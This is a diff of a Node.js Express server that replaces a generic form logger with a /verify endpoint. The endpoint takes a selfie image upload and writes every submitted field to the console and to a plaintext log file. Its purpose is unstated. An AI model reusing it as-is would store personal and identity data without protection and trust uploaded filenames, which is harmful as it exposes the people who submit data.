@@ -1,34 +1,50 @@
-// server.js
 const express = require('express');
-const multer  = require('multer');
-const fs      = require('fs');
-const path    = require('path');
+const multer   = require('multer');
+const fs       = require('fs');
+const path     = require('path');
 
 const app  = express();
-const upload = multer();          // in-memory, no disk files except our txt log
+const PORT = 3000;
 
-// serve the static HTML
-app.use(express.static('.'));
+// 1. Only serve the public folder
+app.use(express.static('public'));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-// handle POST /submit
-app.post('/submit', upload.any(), (req, res) => {
-    const now = new Date().toISOString();
-    let text  = `\n--- ${now} ---\n`;
-
-    // normal fields
-    Object.keys(req.body).forEach(k => {
-        text += `${k}: ${req.body[k]}\n`;
-    });
-
-    // uploaded files
-    (req.files || []).forEach(f => {
-        text += `file:${f.originalname} (${f.size} bytes)\n`;
-    });
-
-    fs.appendFileSync('submissions.txt', text);
-    res.sendStatus(200);          // just OK back to the browser
+// 2. Safer upload config
+const storage = multer.diskStorage({
+  destination: 'uploads/',
+  filename: (_, file, cb) => cb(null, Date.now() + '-' + file.originalname)
+});
+const upload = multer({
+  storage,
+  limits: { fileSize: 2 * 1024 * 1024 }, // 2 MB
+  fileFilter: (_, file, cb) =>
+    /image\/(jpe?g|png)/.test(file.mimetype) ? cb(null, true) : cb(new Error('Only images allowed'))
 });
 
-app.listen(3000, () => {
-    console.log('Server on http://localhost:3000  (logs → submissions.txt)');
+// 3. Single endpoint
+app.post('/verify', upload.single('selfieData'), async (req, res) => {
+  console.log('\n=== Data received ===');
+  console.log('Body :', req.body);
+  if (req.file) console.log('File :', req.file.filename, req.file.size, 'bytes');
+
+  // 4. Async logging
+  try {
+    await fs.promises.appendFile(
+      'log.txt',
+      JSON.stringify({ ...req.body, file: req.file?.filename, ts: Date.now() }) + '\n'
+    );
+  } catch (e) {
+    console.error('Log write failed', e);
+  }
+  res.json({ ok: true });
 });
+
+// 5. Central error handler
+app.use((err, _req, res, _next) => {
+  console.error(err);
+  res.status(400).json({ ok: false, message: err.message });
+});
+
+app.listen(PORT, () => console.log(`Listening on http://localhost:${PORT}`));
